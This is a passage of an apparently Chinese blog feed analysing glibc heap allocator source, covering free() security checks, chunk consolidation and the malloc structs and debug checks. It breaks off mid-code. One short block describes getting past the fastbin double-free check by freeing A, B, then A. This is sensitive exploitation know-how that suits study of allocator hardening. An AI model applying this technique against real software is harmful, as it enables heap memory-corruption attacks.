&amp;&amp; __builtin_expect (old_idx != idx, <span class="hljs-number">0</span>))<br>    &#123;<br>errstr = <span class="hljs-string">&quot;invalid fastbin entry (free)&quot;</span>;<br><span class="hljs-keyword">goto</span> errout;<br>    &#125;<br></code></pre></td></tr></table></figure><blockquote><p>#原来的指向 FB –fd–&gt; OLD </p><p>#新插入的指向 FB –fd–&gt; P –fd–&gt; OLD</p></blockquote><p>出现的安全检查：</p><p>1、这里是主要检查double free，一个chunk不能被连续释放两次</p><p>2、chunk的size对应的idx要和fast bin的idx能对应上，即要将合适大小的chunk放到其对应的 fast bin中去</p><blockquote><p>#非法释放 FB –fd–&gt; A –fd–&gt; A </p><p>#逃过检查的方式：1、free(A); 2、free(B); 3、free(A) </p><p>FB –fd–&gt; A </p><p>FB –fd–&gt; B –fd–&gt; A </p><p>FB –fd–&gt; A –fd–&gt; B –fd–&gt; A</p></blockquote><h3 id="处理非fast-chunk【else-if】"><a href="#处理非fast-chunk【else-if】" class="headerlink" title="处理非fast chunk【else if】"></a>处理非fast chunk【else if】</h3><h4 id="安全检查-1"><a href="#安全检查-1" class="headerlink" title="安全检查"></a>安全检查</h4><p>上锁然后进行一系列的安全检查：</p><ul><li>看释放的chunk是否是top chunk</li><li>chunk是否超出了arena的边界，这里使用的比较符是&gt;&#x3D;top + sizeof(top)</li><li>通过next chunk看当前的chunk是否inuse，如果inuse为0，说明double free</li><li>然后就是判断nextchunk的size是否在范围内</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs C">      <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!chunk_is_mmapped(p)) &#123; <br><span class="hljs-keyword">if</span> (! have_lock) &#123;<br>          (<span class="hljs-type">void</span>)mutex_lock(&amp;av-&gt;mutex);<br>          locked = <span class="hljs-number">1</span>;<br>        &#125;<br><br>        nextchunk = chunk_at_offset(p, size);<br><br>        <span class="hljs-comment">/* Lightweight tests: check whether the block is already the</span><br><span class="hljs-comment">          top block.  */</span><br>        <span class="hljs-keyword">if</span> (__glibc_unlikely (p == av-&gt;top))<br>          &#123;<br>      errstr = <span class="hljs-string">&quot;double free or corruption (top)&quot;</span>;<br>      <span class="hljs-keyword">goto</span> errout;<br>          &#125;<br>        <span class="hljs-comment">/* Or whether the next chunk is beyond the boundaries of the arena.  */</span><br>        <span class="hljs-keyword">if</span> (__builtin_expect (contiguous (av)<br>            &amp;&amp; (<span class="hljs-type">char</span> *) nextchunk<br>            &gt;= ((<span class="hljs-type">char</span> *) av-&gt;top + chunksize(av-&gt;top)), <span class="hljs-number">0</span>))<br>          &#123;<br>      errstr = <span class="hljs-string">&quot;double free or corruption (out)&quot;</span>;<br>      <span class="hljs-keyword">goto</span> errout;<br>          &#125;<br>        <span class="hljs-comment">/* Or whether the block is actually not marked used.  */</span><br>        <span class="hljs-keyword">if</span> (__glibc_unlikely (!prev_inuse(nextchunk)))<br>          &#123;<br>      errstr = <span class="hljs-string">&quot;double free or corruption (!prev)&quot;</span>;<br>      <span class="hljs-keyword">goto</span> errout;<br>          &#125;<br><br>        nextsize = chunksize(nextchunk);<br>        <span class="hljs-keyword">if</span> (__builtin_expect (nextchunk-&gt;size &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>)<br>      || __builtin_expect (nextsize &gt;= av-&gt;system_mem, <span class="hljs-number">0</span>))<br>          &#123;<br>      errstr = <span class="hljs-string">&quot;free(): invalid next size (normal)&quot;</span>;<br>      <span class="hljs-keyword">goto</span> errout;<br>          &#125;<br></code></pre></td></tr></table></figure><h4 id="合并操作"><a href="#合并操作" class="headerlink" title="合并操作"></a>合并操作</h4><p>1、首先后向合并操作即试图和前面一个chunk进行合并，同时将前一个chunk进行unlink操作</p><p>2、然后前向合并即试图和后面一个chunk进行合并，这个需要保证后面一个chunk不是top chunk</p><ul><li>如果没有和后面一个chunk进行合并，就在nextchunk中设置inuse状态为0，即没有在用</li></ul><p>3、将该chunk放进unsorted bin中，首先是进行安全检查，保证双向链表是符合规范的</p><ul><li>bck为unsorted bin，fwd是bck-&gt;fd，要保证fwd-&gt;bk &#x3D;&#x3D; bck</li><li>每次向unsorted bin中插入新的chunk，都插在unsorted bin-&gt;bk位置</li><li>set_head主要用来设置size的pre_inuse字段，set_foot主要用来设置下一个chunk的pre_size字段</li></ul><p>4、如果前向合并是与top chunk进行合并，需要设置新的top chunk</p><p><img src="/2023/11/27/free%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20240826172303730.png"></p><p><img src="/2023/11/27/free%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20240826172308253.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">/* consolidate backward */</span><br><span class="hljs-keyword">if</span> (!prev_inuse(p)) &#123;<br>  prevsize = p-&gt;prev_size;<br>  size += prevsize;<br>  p = chunk_at_offset(p, -((<span class="hljs-type">long</span>) prevsize));<br>  unlink(av, p, bck, fwd);<br>&#125;<br><br><span class="hljs-keyword">if</span> (nextchunk != av-&gt;top) &#123;<br>      <span class="hljs-comment">/* get and clear inuse bit */</span><br>      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);<br><br>      <span class="hljs-comment">/* consolidate forward */</span><br>      <span class="hljs-keyword">if</span> (!nextinuse) &#123;<br>  unlink(av, nextchunk, bck, fwd);<br>  size += nextsize;<br>      &#125; <span class="hljs-keyword">else</span><br>  clear_inuse_bit_at_offset(nextchunk, <span class="hljs-number">0</span>);<br><br>      <span class="hljs-comment">/*</span><br><span class="hljs-comment">  Place the chunk in unsorted chunk list. Chunks are</span><br><span class="hljs-comment">  not placed into regular bins until after they have</span><br><span class="hljs-comment">  been given one chance to be used in malloc.</span><br><span class="hljs-comment">      */</span><br><br>      bck = unsorted_chunks(av);<br>      fwd = bck-&gt;fd;<br>      <span class="hljs-keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))<br>  &#123;<br>    errstr = <span class="hljs-string">&quot;free(): corrupted unsorted chunks&quot;</span>;<br>    <span class="hljs-keyword">goto</span> errout;<br>  &#125;<br>      p-&gt;fd = fwd;<br>      p-&gt;bk = bck;<br>      <span class="hljs-keyword">if</span> (!in_smallbin_range(size))<br>  &#123;<br>    p-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>    p-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>  &#125;<br>      bck-&gt;fd = p;<br>      fwd-&gt;bk = p;<br><br>      set_head(p, size | PREV_INUSE);<br>      set_foot(p, size);<br><br>      check_free_chunk(av, p);<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">  If the chunk borders the current high end of memory,</span><br><span class="hljs-comment">  consolidate into top</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-keyword">else</span> &#123;<br>  size += nextsize;<br>  set_head(p, size | PREV_INUSE);<br>  av-&gt;top = p;<br>  check_chunk(av, p);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="阈值收缩"><a href="#阈值收缩" class="headerlink" title="阈值收缩"></a>阈值收缩</h4><p>1、如果当前合并后的chunk大小已经达到触发合并操作阈值</p><ul><li>判断fast bin中是否有chunk，如果有则进行合并操作</li><li>如果是主分配区，最后是通过systrim来进行收缩的</li><li>非主分配区，是通过heap_trim来进行收缩的</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs C">        <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123;<br>          <span class="hljs-keyword">if</span> (have_fastchunks(av))<br>      malloc_consolidate(av);<br><br>          <span class="hljs-keyword">if</span> (av == &amp;main_arena) &#123;<br>    <span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> MORECORE_CANNOT_TRIM</span><br>      <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(chunksize(av-&gt;top)) &gt;=<br>          (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(mp_.trim_threshold))<br>        systrim(mp_.top_pad, av);<br>    <span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>          &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-comment">/* Always try heap_trim(), even if the top chunk is not</span><br><span class="hljs-comment">        large, because the corresponding heap might go away.  */</span><br>      heap_info *heap = heap_for_ptr(top(av));<br><br>      assert(heap-&gt;ar_ptr == av);<br>      heap_trim(heap, mp_.top_pad);<br>          &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (! have_lock) &#123;<br>          assert (locked);<br>          (<span class="hljs-type">void</span>)mutex_unlock(&amp;av-&gt;mutex);<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="处理map-chunk【else】"><a href="#处理map-chunk【else】" class="headerlink" title="处理map chunk【else】"></a>处理map chunk【else】</h3><p>调用munmap_chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">else</span> &#123;<br>    munmap_chunk (p);<br>  &#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>堆</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>malloc源码分析</title>
    <link href="/2023/11/26/malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
    <url>/2023/11/26/malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h1 id="malloc源码解析"><a href="#malloc源码解析" class="headerlink" title="malloc源码解析"></a>malloc源码解析</h1><p>首先看下没有tcache 的glibc， 接着看下加入tcache的版本</p><h2 id="基础结构体"><a href="#基础结构体" class="headerlink" title="基础结构体"></a>基础结构体</h2><p>glibc是从系统中map一块内存，然后利用自己的结构体进行管理</p><h3 id="malloc-chunk"><a href="#malloc-chunk" class="headerlink" title="malloc_chunk"></a>malloc_chunk</h3><p>在glibc中申请的块结构体如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span> &#123;</span><br><br>  INTERNAL_SIZE_T      prev_size;  <span class="hljs-comment">/* Size of previous chunk (if free).  */</span><br>  INTERNAL_SIZE_T      size;       <span class="hljs-comment">/* Size in bytes, including overhead. */</span><br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">fd</span>;</span>         <span class="hljs-comment">/* double links -- used only if free. */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">bk</span>;</span><br><br>  <span class="hljs-comment">/* Only used for large blocks: pointer to next larger size.  */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">fd_nextsize</span>;</span> <span class="hljs-comment">/* double links -- used only if free. */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">bk_nextsize</span>;</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>下面是各字段的位置以及含义<br><img src="/2023/11/26/malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20240826095121807.png"></p><h3 id="malloc-state"><a href="#malloc-state" class="headerlink" title="malloc_state"></a>malloc_state</h3><p>我们在了解glibc的堆分配时可能会听到arena，其实就是下面的结构体，可以用来记录top、fastbin和bins的信息</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-comment">/* Serialize access.  */</span><br>  <span class="hljs-type">mutex_t</span> mutex;<br><br>  <span class="hljs-comment">/* Flags (formerly in max_fast).  */</span><br>  <span class="hljs-type">int</span> flags;<br><br>  <span class="hljs-comment">/* Fastbins */</span><br>  mfastbinptr fastbinsY[NFASTBINS];<br><br>  <span class="hljs-comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span><br>  mchunkptr top;<br><br>  <span class="hljs-comment">/* The remainder from the most recent split of a small request */</span><br>  mchunkptr last_remainder;<br><br>  <span class="hljs-comment">/* Normal bins packed as described above */</span><br>  mchunkptr bins[NBINS * <span class="hljs-number">2</span> - <span class="hljs-number">2</span>];<br><br>  <span class="hljs-comment">/* Bitmap of bins */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> binmap[BINMAPSIZE];<br><br>  <span class="hljs-comment">/* Linked list */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span> *<span class="hljs-title">next</span>;</span><br><br>  <span class="hljs-comment">/* Linked list for free arenas.  Access to this field is serialized</span><br><span class="hljs-comment">     by free_list_lock in arena.c.  */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span> *<span class="hljs-title">next_free</span>;</span><br><br>  <span class="hljs-comment">/* Number of threads attached to this arena.  0 if the arena is on</span><br><span class="hljs-comment">     the free list.  Access to this field is serialized by</span><br><span class="hljs-comment">     free_list_lock in arena.c.  */</span><br>  INTERNAL_SIZE_T attached_threads;<br><br>  <span class="hljs-comment">/* Memory allocated from the system in this arena.  */</span><br>  INTERNAL_SIZE_T system_mem;<br>  INTERNAL_SIZE_T max_system_mem;<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="heap-info"><a href="#heap-info" class="headerlink" title="heap_info"></a>heap_info</h3><p>glibc中堆分配时遇到的heap结构即下面的结构体：包含了前一个heap和当前heap的大小，还有就是当前heap的arena</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">heap_info</span></span><br><span class="hljs-class">&#123;</span><br>  mstate ar_ptr; <span class="hljs-comment">/* Arena for this heap. */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">heap_info</span> *<span class="hljs-title">prev</span>;</span> <span class="hljs-comment">/* Previous heap. */</span><br>  <span class="hljs-type">size_t</span> size;   <span class="hljs-comment">/* Current size in bytes. */</span><br>  <span class="hljs-type">size_t</span> mprotect_size; <span class="hljs-comment">/* Size in bytes that has been mprotected</span><br><span class="hljs-comment">                           PROT_READ|PROT_WRITE.  */</span><br>  <span class="hljs-comment">/* Make sure the following data is properly aligned, particularly</span><br><span class="hljs-comment">     that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of</span><br><span class="hljs-comment">     MALLOC_ALIGNMENT. */</span><br>  <span class="hljs-type">char</span> pad[<span class="hljs-number">-6</span> * SIZE_SZ &amp; MALLOC_ALIGN_MASK];<br>&#125; heap_info;<br></code></pre></td></tr></table></figure><h2 id="do-check的一些函数"><a href="#do-check的一些函数" class="headerlink" title="do_check的一些函数"></a>do_check的一些函数</h2><p>这部分主要就是在glibc开启debug模式下才会调用的函数，这里单独拿出来看下</p><h3 id="do-check-remalloced-chunk"><a href="#do-check-remalloced-chunk" class="headerlink" title="do_check_remalloced_chunk"></a>do_check_remalloced_chunk</h3><p>下面这部分主要判断：</p><p>该chunk要对应上其arena，以及其arena是否为main_arena要和其size中的标志位能对应上；</p><p>对该chunk进行使用状态检查；</p><p>该chunk的size要对齐，大小符合规范；</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">do_check_remalloced_chunk</span> <span class="hljs-params">(mstate av, mchunkptr p, INTERNAL_SIZE_T s)</span><br>&#123;<br>  INTERNAL_SIZE_T sz = p-&gt;size &amp; ~(PREV_INUSE | NON_MAIN_ARENA);<br><span class="hljs-comment">//</span><br><span class="hljs-comment">//这部分主要检查chunk是否能对应上其arena，还有是否为main_arena这个问题</span><br><span class="hljs-comment">//</span><br>  <span class="hljs-keyword">if</span> (!chunk_is_mmapped (p))<br>    &#123;<br>      assert (av == arena_for_chunk (p));<br>      <span class="hljs-keyword">if</span> (chunk_non_main_arena (p))<br>        assert (av != &amp;main_arena);<br>      <span class="hljs-keyword">else</span><br>        assert (av == &amp;main_arena);<br>    &#125;<br><br>  do_check_inuse_chunk (av, p);<br><br>  <span class="hljs-comment">/* Legal size ... */</span><br>  assert ((sz &amp; MALLOC_ALIGN_MASK) == <span class="hljs-number">0</span>);<br>  assert ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (sz) &gt;= MINSIZE);<br>  <span class="hljs-comment">/* ... and alignment */</span><br>  assert (aligned_OK (chunk2mem (p)));<br>  <span class="hljs-comment">/* chunk is less than MINSIZE more than request */</span><br>  assert ((<span class="hljs-type">long</span>) (sz) - (<span class="hljs-type">long</span>) (s) &gt;= <span class="hljs-number">0</span>);<br>  assert ((<span class="hljs-type">long</span>) (sz) - (<span class="hljs-type">long</span>) (s + MINSIZE) &lt; <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="do-check-inuse-chunk"><a href="#do-check-inuse-chunk" class="headerlink" title="do_check_inuse_chunk"></a>do_check_inuse_chunk</h3><p>下面判断了：</p><p>该chunk要处于使用状态；</p><p>如果该chunk的物理相邻的前一个chunk处于未使用状态：</p><p>则用来判断前一个chunk的后一个chunk是该chunk；</p><p>判断前一个空闲chunk符合释放规范</p><p>如果该chunk物理相邻的下一个chunk是topchunk：</p><p>就检查一下topchunk的大小以及</p><p>通过top chunk来判断该chunk处于使用状态</p><p>如果该chunk物理相邻的下一个chunk不是topchunk，并且处于未使用状态：</p><p>确保下一个chunk符合释放规范</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">do_check_inuse_chunk</span> <span class="hljs-params">(mstate av, mchunkptr p)</span><br>&#123;<br>  mchunkptr next;<br><br>  do_check_chunk (av, p);<br><br>  <span class="hljs-keyword">if</span> (chunk_is_mmapped (p))<br>    <span class="hljs-keyword">return</span>; <span class="hljs-comment">/* mmapped chunks have no next/prev */</span><br><br>  <span class="hljs-comment">/* Check whether it claims to be in use ... */</span><br>  <span class="hljs-comment">//该chunk处于使用状态，判断方式是通过物理相邻的下一个chunk来判断</span><br>  assert (inuse (p));<br><br>  next = next_chunk (p);<br><br>  <span class="hljs-comment">/* ... and is surrounded by OK chunks.</span><br><span class="hljs-comment">     Since more things can be checked with free chunks than inuse ones,</span><br><span class="hljs-comment">     if an inuse chunk borders them and debug is on, it&#x27;s worth doing them.</span><br><span class="hljs-comment">   */</span><br>  <span class="hljs-keyword">if</span> (!prev_inuse (p))<br>    &#123;<br>      <span class="hljs-comment">/* Note that we cannot even look at prev unless it is not inuse */</span><br>      mchunkptr prv = prev_chunk (p);<br>      assert (next_chunk (prv) == p);<br>      do_check_free_chunk (av, prv);<br>    &#125;<br><br>  <span class="hljs-keyword">if</span> (next == av-&gt;top)<br>    &#123;<br>      assert (prev_inuse (next));<br>      assert (chunksize (next) &gt;= MINSIZE);<br>    &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!inuse (next))<br>    do_check_free_chunk (av, next);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="do-check-free-chunk"><a href="#do-check-free-chunk" class="headerlink" title="do_check_free_chunk"></a>do_check_free_chunk</h3><p>下面检查已释放的chunk，检查以下几个方面：</p><p>基本的chunk规范检查；</p><p>该chunk处于未使用状态；</p><p>该chunk不是mapped；</p><p>该chunk的大小对齐；</p><p>该chunk的size和下一个物理相邻chunk所记录的一致；</p><p>该chunk与其物理相邻的chunk该合并的已合并，通过判断前一个或后一个chunk的使用状态；</p><p>该chunk与其物理相邻chunk的链接确保规范；</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">do_check_free_chunk</span> <span class="hljs-params">(mstate av, mchunkptr p)</span><br>&#123;<br>  INTERNAL_SIZE_T sz = p-&gt;size &amp; ~(PREV_INUSE | NON_MAIN_ARENA);<br>  mchunkptr next = chunk_at_offset (p, sz);<br><br>  do_check_chunk (av, p);<br><br>  <span class="hljs-comment">/* Chunk must claim to be free ... */</span><br>  assert (!inuse (p));<br>  assert (!chunk_is_mmapped (p));<br><br>  <span class="hljs-comment">/* Unless a special marker, must have OK fields */</span><br>  <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (sz) &gt;= MINSIZE)<br>    &#123;<br>      assert ((sz &amp; MALLOC_ALIGN_MASK) == <span class="hljs-number">0</span>);<br>      assert (aligned_OK (chunk2mem (p)));<br>      <span class="hljs-comment">/* ... matching footer field */</span><br>      assert (next-&gt;prev_size == sz);<br>      <span class="hljs-comment">/* ... and is fully consolidated */</span><br>      assert (prev_inuse (p));<br>      assert (next == av-&gt;top || inuse (next));<br><br>      <span class="hljs-comment">/* ... and has minimally sane links */</span><br>      assert (p-&gt;fd-&gt;bk == p);<br>      assert (p-&gt;bk-&gt;fd == p);<br>    &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-comment">/* markers are always of size SIZE_SZ */</span><br>    assert (sz == SIZE_SZ);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="do-check-chunk"><a href="#do-check-chunk" class="headerlink" title="do_check_chunk"></a>do_check_chunk</h3><p>下面的判断是检查chunk的地址在其应在的范围内</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">do_check_chunk</span> <span class="hljs-params">(mstate av, mchunkptr p)</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> sz = chunksize (p);<br>  <span class="hljs-comment">/* min and max possible addresses assuming contiguous allocation */</span><br>  <span class="hljs-type">char</span> *max_address = (<span class="hljs-type">char</span> *) (av-&gt;top) + chunksize (av-&gt;top);<br>  <span class="hljs-type">char</span> *min_address = max_address - av-&gt;system_mem;<br><br>  <span class="hljs-keyword">if</span> (!chunk_is_mmapped (p))<br>    &#123;<br>      <span class="hljs-comment">/* Has legal address ... */</span><br>      <span 